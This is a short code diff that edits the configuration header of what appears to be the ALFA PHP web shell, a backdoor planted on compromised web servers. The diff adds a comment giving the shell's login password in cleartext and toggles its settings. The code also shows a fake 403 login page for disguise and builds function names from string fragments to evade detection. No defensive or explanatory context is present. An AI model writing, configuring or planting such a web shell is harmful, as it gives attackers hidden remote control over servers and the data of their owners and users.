@@ -1,12 +1,12 @@
 <?php
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
-    'password' => 'b71c31bca4b9d422190405c8f24049fb',
+    'password' => 'b71c31bca4b9d422190405c8f24049fb',//password: privdayz
     'safe_mode' => '0',
     'login_page' => '403',
     'show_icons' => '1',
-    'post_encryption' => ture,
-    'cgi_api' => true,
+    'post_encryption' => true,
+    'cgi_api' => false,
 );
 
 $CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
